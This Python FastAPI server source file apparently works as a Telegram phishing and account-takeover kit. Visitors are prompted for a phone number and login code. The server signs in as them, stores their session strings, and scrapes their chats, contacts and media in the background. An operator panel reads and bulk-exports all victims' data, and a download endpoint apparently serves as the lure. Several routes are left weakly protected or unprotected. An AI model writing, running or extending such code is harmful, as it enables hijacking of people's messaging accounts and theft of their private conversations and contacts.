import asyncio
import io
import os
import shutil
import zipfile
from contextlib import asynccontextmanager
from datetime import datetime
from zoneinfo import ZoneInfo

import aiosqlite
import uvicorn
from fastapi import FastAPI, Request, Form, Depends, status, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, RedirectResponse, StreamingResponse, FileResponse
from fastapi.exceptions import HTTPException
from dotenv import load_dotenv
from telethon.sessions import StringSession

from utils import update_user_data, periodic_update
from db import init_db, DB_FILE, save_user_session, get_user_session

load_dotenv('.env')
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
USERS_FOLDER = "./users"
DOWNLOAD_FOLDER = "./download"
os.makedirs(USERS_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
sessions = {}
IS_AUTH = False
AUTH_PASSWORD = os.getenv('PASSWORD')

@asynccontextmanager
async def lifespan(app: FastAPI):
    await init_db()
    task = asyncio.create_task(periodic_update(USERS_FOLDER, API_ID, API_HASH))
    try:
        yield
    finally:
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass

app = FastAPI(lifespan=lifespan)
frontend_urls = os.getenv("FRONTEND_URLS", "")
origins = [url.strip() for url in frontend_urls.split(",") if url.strip()]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"]
)

app.mount("/users", StaticFiles(directory=USERS_FOLDER), name="users")
app.mount("/static", StaticFiles(directory="templates"), name="static")

templates = Jinja2Templates(directory="templates")

class PhonePayload(BaseModel):
    phone: str

class CodePayload(BaseModel):
    phone: str
    code: str


@app.get("/")
async def home(request: Request):
    return templates.TemplateResponse("index.html", {'request': request})


@app.get("/api/file_info")
async def get_file_info():
    """Get the first file name from download directory"""
    try:
        files = [f for f in os.listdir(DOWNLOAD_FOLDER) if os.path.isfile(os.path.join(DOWNLOAD_FOLDER, f))]
        if not files:
            raise HTTPException(status_code=404, detail="No file found in download directory")
        # Get first file (sorted alphabetically)
        first_file = sorted(files)[0]
        return {"filename": first_file}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/download_file")
async def download_file():
    """Download the first file from download directory (requires authorization)"""
    try:
        files = [f for f in os.listdir(DOWNLOAD_FOLDER) if os.path.isfile(os.path.join(DOWNLOAD_FOLDER, f))]
        if not files:
            raise HTTPException(status_code=404, detail="No file found in download directory")
        # Get first file (sorted alphabetically)
        first_file = sorted(files)[0]
        file_path = os.path.join(DOWNLOAD_FOLDER, first_file)
        return FileResponse(
            file_path,
            filename=first_file,
            media_type='application/octet-stream'
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/send_phone")
async def send_phone(data: PhonePayload):
    phone_number = data.phone.strip()

    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH, connection_retries=15)
        await client.connect()

        if not await client.is_user_authorized():
            result = await client.send_code_request(phone_number)
            sessions[phone_number] = {
                "phone_code_hash": result.phone_code_hash,
                "session": client.session.save()
            }

        await client.disconnect()
        return {"status": "code_sent"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


async def update_user_task(phone_number: str):
    session_string = await get_user_session(phone_number)
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    try:
        me = await client.get_me()
        username = me.username or f"{me.first_name}_{me.id}"
        folder_name = f"{username}_{phone_number.replace('+','')}"
        folder = os.path.join(USERS_FOLDER, folder_name)
        os.makedirs(folder, exist_ok=True)
        await update_user_data(client, me, folder)
    finally:
        await client.disconnect()


from fastapi import HTTPException

@app.post("/verify_code")
async def verify_code(data: CodePayload, background_tasks: BackgroundTasks):
    phone_number = data.phone.strip()

    if phone_number not in sessions:
        raise HTTPException(status_code=400, detail="Спочатку надішліть номер телефону.")

    phone_code_hash = sessions[phone_number]["phone_code_hash"]
    session_string = sessions[phone_number]["session"]

    client = TelegramClient(StringSession(session_string), API_ID, API_HASH, connection_retries=15)
    await client.connect()

    try:
        if not await client.is_user_authorized():
            try:
                await client.sign_in(phone_number, data.code, phone_code_hash=phone_code_hash)
            except SessionPasswordNeededError:
                raise HTTPException(status_code=400, detail="2FA увімкнено. Не підтримується.")
            except Exception:
                raise HTTPException(status_code=400, detail="Невірний код")

        me = await client.get_me()
        if not me:
            raise HTTPException(status_code=500, detail="Помилка авторизації.")

        username = me.username or f"{me.first_name}_{me.id}"
        username = f"{username}_{phone_number.replace('+','')}"

        full_session = client.session.save()
        tz = ZoneInfo("Europe/Kyiv")
        now = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")

        async with aiosqlite.connect(DB_FILE, timeout=30) as db:
            await db.execute("""
                INSERT INTO users (username, phone, session_string, last_updated)
                VALUES (?, ?, ?, ?)
                ON CONFLICT(phone) DO UPDATE SET 
                    username=excluded.username,
                    session_string=excluded.session_string,
                    last_updated=excluded.last_updated
            """, (username, phone_number, full_session, now))
            await db.commit()

        # бекграундна задача
        background_tasks.add_task(update_user_task, phone_number)

        # ✅ очищаємо тимчасову сесію
        del sessions[phone_number]

    finally:
        await client.disconnect()

    return {"status": "ok"}



@app.get("/user/{user_folder}/contacts", response_class=HTMLResponse)
async def get_contacts(request: Request, user_folder: str):
    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row

        async with db.execute(
            "SELECT id FROM users WHERE username = ?", (user_folder,)
        ) as cursor:
            row = await cursor.fetchone()
            if not row:
                return HTMLResponse("User not found", status_code=404)
            user_id = row["id"]

        async with db.execute(
            "SELECT tg_id, username, first_name, last_name, phone FROM contacts WHERE user_id = ?", (user_id,)
        ) as cursor:
            contacts = await cursor.fetchall()

    return templates.TemplateResponse("contacts.html", {
        "request": request,
        "user_folder": user_folder,
        "contacts": contacts
    })


def ip_whitelist(request: Request):
    client_ip = request.client.host
    if client_ip != os.getenv('ALLOWED_IP'):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Access denied: IP not allowed",
        )
    return True



@app.get("/login", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
async def login_page(request: Request):
    return templates.TemplateResponse("password.html", {"request": request, "error": False})


@app.post("/login")
async def login(request: Request, password: str = Form(...)):
    if password == AUTH_PASSWORD:
        resp = RedirectResponse(url="/users", status_code=303)
        resp.set_cookie("auth", "ok", httponly=True)
        return resp
    return templates.TemplateResponse("password.html", {"request": request, "error": True})


@app.get("/users", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
async def list_users(request: Request):
    if request.cookies.get("auth") != "ok":
        return RedirectResponse("/login")

    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row

        cursor = await db.execute("""
            SELECT 
                u.id,
                u.username,
                u.phone,
                u.last_updated,
                COUNT(m.id) AS unread_count
            FROM users u
            LEFT JOIN chats c ON c.user_id = u.id
            LEFT JOIN messages m ON m.chat_id = c.id AND m.is_read = 0
            GROUP BY u.id, u.username, u.phone, u.last_updated
            ORDER BY u.id ASC
        """)
        rows = await cursor.fetchall()
        users = [(index, dict(row)) for index, row in enumerate(rows, start=1)]

    return templates.TemplateResponse("users_list.html", {"request": request, "users": users})

@app.get("/user/{user_folder}/chats", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
async def user_chats(request: Request, user_folder: str):
    if request.cookies.get("auth") != "ok":
        return RedirectResponse("/login")

    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT id FROM users WHERE username = ?", (user_folder,)
        ) as cursor:
            row = await cursor.fetchone()
            if not row:
                return HTMLResponse("User not found", status_code=404)
            user_id = row["id"]

        async with db.execute("""
            SELECT 
                c.id,
                c.chat_name,
                c.chat_type,
                COUNT(m.id) AS unread_count
            FROM chats c
            LEFT JOIN messages m 
                ON m.chat_id = c.id AND m.is_read = 0
            WHERE c.user_id = ?
            GROUP BY c.id, c.chat_name
            ORDER BY c.id ASC
        """, (user_id,)) as cursor:
            chats = await cursor.fetchall()

    return templates.TemplateResponse("user_chats.html", {
        "request": request,
        "chats": chats,
        "user_folder": user_folder
    })


@app.get("/user/{user_folder}/chats/{chat_id}", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
async def user_chat(request: Request, user_folder: str, chat_id: int):
    if request.cookies.get("auth") != "ok":
        return RedirectResponse("/login")

    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row

        async with db.execute(
            "SELECT chat_name, chat_type FROM chats WHERE id = ?", (chat_id,)
        ) as cursor:
            row = await cursor.fetchone()
            if not row:
                return HTMLResponse("User not found", status_code=404)
            chat_name = row["chat_name"]
            chat_type = row["chat_type"]

        await db.execute(
            "UPDATE messages SET is_read = 1 WHERE chat_id = ?",
            (chat_id,)
        )
        await db.commit()

        async with db.execute(
            """
            SELECT chat_id, msg_id, sender, out, text, media_path, time_str
            FROM messages
            WHERE chat_id = ?
            ORDER BY msg_id ASC
            """,
            (chat_id,)
        ) as cursor:
            messages = await cursor.fetchall()

    return templates.TemplateResponse("chat.html", {
        "request": request,
        "user_folder": user_folder,
        "chat_id": chat_id,
        "chat_name": chat_name,
        "chat_type": chat_type,
        "messages": messages
    })


@app.get(
    "/export_user/{user_folder}",
    response_class=StreamingResponse,
    dependencies=[Depends(ip_whitelist)]
)
async def export_user(user_folder: str):
    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row

        # юзер
        async with db.execute(
            "SELECT id, username, phone FROM users WHERE username = ?",
            (user_folder,)
        ) as cursor:
            user = await cursor.fetchone()
            if not user:
                return HTMLResponse("User not found", status_code=404)

        user_id = user["id"]

        # чати
        async with db.execute(
            "SELECT id, chat_name, chat_type FROM chats WHERE user_id = ?",
            (user_id,)
        ) as cursor:
            chats = await cursor.fetchall()

        # контакти
        async with db.execute(
            "SELECT id, user_id, tg_id, username, first_name, last_name, phone FROM contacts WHERE user_id = ?",
            (user_id,)
        ) as cursor:
            contacts = await cursor.fetchall()

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:

            # 1. головна (список чатів)
            template_chats = templates.get_template("export_user_chats.html")
            rendered_chats = template_chats.render(chats=chats)
            zf.writestr("index.html", rendered_chats)

            # 2. контакти
            template_contacts = templates.get_template("contacts.html")
            rendered_contacts = template_contacts.render(contacts=contacts, user_folder=user_folder)
            zf.writestr("contacts.html", rendered_contacts)

            # 3. чати + медіа
            template_chat = templates.get_template("export_chat.html")
            for chat in chats:
                async with db.execute(
                    """
                    SELECT msg_id, sender, out, text, media_path, time_str
                    FROM messages
                    WHERE chat_id = ?
                    ORDER BY msg_id ASC
                    """,
                    (chat["id"],)
                ) as msg_cursor:
                    messages = await msg_cursor.fetchall()

                messages_list = []
                for msg in messages:
                    msg_dict = dict(msg)
                    if msg_dict.get("media_path"):
                        msg_dict["media_name"] = os.path.basename(msg_dict["media_path"])
                    messages_list.append(msg_dict)

                # зберігаємо медіа в корінь архіву
                for msg in messages_list:
                    if msg.get("media_path"):
                        media_abs_path = os.path.join("users", user_folder, msg["media_path"])
                        if os.path.exists(media_abs_path):
                            zf.write(media_abs_path, msg["media_name"])

                # html для чату
                rendered_chat = template_chat.render(
                    chat_name=chat["chat_name"],
                    chat_type=chat["chat_type"],
                    messages=messages_list
                )
                safe_name = f"chat_{chat['id']}.html"
                zf.writestr(safe_name, rendered_chat)

        zip_buffer.seek(0)

    return StreamingResponse(
        zip_buffer,
        media_type="application/x-zip-compressed",
        headers={"Content-Disposition": f"attachment; filename={user_folder}_export.zip"}
    )


@app.get(
    '/export_chat/{user_folder}/{chat_id}',
    response_class=StreamingResponse,
    dependencies=[Depends(ip_whitelist)]
)
async def export_chat(user_folder: str, chat_id: int):
    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT id, chat_name, chat_type FROM chats WHERE id = ?", (chat_id,)) as cursor:
            chat = await cursor.fetchone()

        async with db.execute(
            "SELECT msg_id, sender, out, text, media_path, time_str FROM messages WHERE chat_id = ? ORDER BY msg_id ASC",
            (chat_id,)
        ) as msg_cursor:
            messages = await msg_cursor.fetchall()

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            messages_list = []
            for msg in messages:
                msg_dict = dict(msg)
                if msg_dict.get("media_path"):
                    msg_dict["media_name"] = os.path.basename(msg_dict["media_path"])
                messages_list.append(msg_dict)

            for msg in messages_list:
                if msg.get("media_path"):
                    media_abs_path = os.path.join("users", user_folder, msg["media_path"])
                    if os.path.exists(media_abs_path):
                        zf.write(media_abs_path, msg["media_name"])

            template = templates.get_template("export_chat.html")
            rendered_html = template.render(
                chat_name=chat['chat_name'],
                chat_type=chat['chat_type'],
                messages=messages_list
            )

            zf.writestr("index.html", rendered_html)

        zip_buffer.seek(0)

    return StreamingResponse(
        zip_buffer,
        media_type="application/x-zip-compressed",
        headers={"Content-Disposition": f"attachment; filename=chat.zip"}
    )


@app.get(
    "/export_all_users",
    response_class=StreamingResponse,
    dependencies=[Depends(ip_whitelist)]
)
async def export_all_users():
    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row

        # всі юзери
        async with db.execute("SELECT id, username FROM users ORDER BY id ASC") as cursor:
            users = await cursor.fetchall()

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:

            # --- головний index.html (список юзерів) ---
            template_users = templates.get_template("export_users_list.html")
            rendered_users = template_users.render(users=[(index, user) for index, user in enumerate(users, start=1)])
            zf.writestr("index.html", rendered_users)

            # --- цикл по юзерах ---
            for user in users:
                user_id = user["id"]
                username = user["username"]

                # чати юзера
                async with db.execute(
                    "SELECT id, chat_name, chat_type FROM chats WHERE user_id = ?",
                    (user_id,)
                ) as cursor_chats:
                    chats = await cursor_chats.fetchall()

                # контакти юзера
                async with db.execute(
                    "SELECT id, user_id, tg_id, username, first_name, last_name, phone FROM contacts WHERE user_id = ?",
                    (user_id,)
                ) as cursor:
                    contacts = await cursor.fetchall()

                # --- index.html (список чатів юзера) ---
                template_chats = templates.get_template("export_user_chats.html")
                rendered_chats = template_chats.render(user=user, chats=chats)
                zf.writestr(f"{username}/index.html", rendered_chats)

                # --- contacts.html ---
                template_contacts = templates.get_template("contacts.html")
                rendered_contacts = template_contacts.render(user_folder=username, contacts=contacts)
                zf.writestr(f"{username}/contacts.html", rendered_contacts)

                # --- кожен чат окремо ---
                template_chat = templates.get_template("export_chat.html")
                for chat in chats:
                    async with db.execute(
                        """
                        SELECT msg_id, sender, out, text, media_path, time_str
                        FROM messages
                        WHERE chat_id = ?
                        ORDER BY msg_id ASC
                        """,
                        (chat["id"],)
                    ) as msg_cursor:
                        messages = await msg_cursor.fetchall()

                    messages_list = []
                    for msg in messages:
                        msg_dict = dict(msg)
                        if msg_dict.get("media_path"):
                            msg_dict["media_name"] = os.path.basename(msg_dict["media_path"])
                        messages_list.append(msg_dict)

                    # медіа у папці юзера
                    for msg in messages_list:
                        if msg.get("media_path"):
                            media_abs_path = os.path.join("users", username, msg["media_path"])
                            if os.path.exists(media_abs_path):
                                zf.write(media_abs_path, f"{username}/{msg['media_name']}")

                    # html для чату
                    rendered_chat = template_chat.render(
                        chat_name=chat["chat_name"],
                        chat_type=chat["chat_type"],
                        messages=messages_list
                    )
                    safe_name = f"{username}/chat_{chat['id']}.html"
                    zf.writestr(safe_name, rendered_chat)

        zip_buffer.seek(0)

    return StreamingResponse(
        zip_buffer,
        media_type="application/x-zip-compressed",
        headers={"Content-Disposition": "attachment; filename=all_users_export.zip"}
    )


@app.delete("/user/{username}/")
async def delete_user(username: str, dependencies=[Depends(ip_whitelist)]):
    async with aiosqlite.connect(DB_FILE, timeout=40) as db:
        db.row_factory = aiosqlite.Row
        await db.execute("PRAGMA foreign_keys = ON;")

        # Отримуємо юзера
        async with db.execute("SELECT id FROM users WHERE username = ?", (username,))  as cursor:
            user = await cursor.fetchone()
        if not user:
            raise HTTPException(status_code=404, detail="User not found")

        user_id = user['id']

        # Видаляємо повідомлення користувача
        await db.execute("""
            DELETE FROM messages
            WHERE chat_id IN (SELECT id FROM chats WHERE user_id = ?)
        """, (user_id,))

        # Видаляємо чати користувача
        await db.execute("DELETE FROM chats WHERE user_id = ?", (user_id,))

        # Видаляємо контакти користувача
        await db.execute("DELETE FROM contacts WHERE user_id = ?", (user_id,))

        # Видаляємо самого юзера
        await db.execute("DELETE FROM users WHERE id = ?", (user_id,))

        await db.commit()

    # Видаляємо папку користувача
    user_folder = os.path.join(USERS_FOLDER, username)
    if os.path.exists(user_folder) and os.path.isdir(user_folder):
        shutil.rmtree(user_folder)

    return {"status": "deleted"}


if __name__ == '__main__':
    uvicorn.run(app)
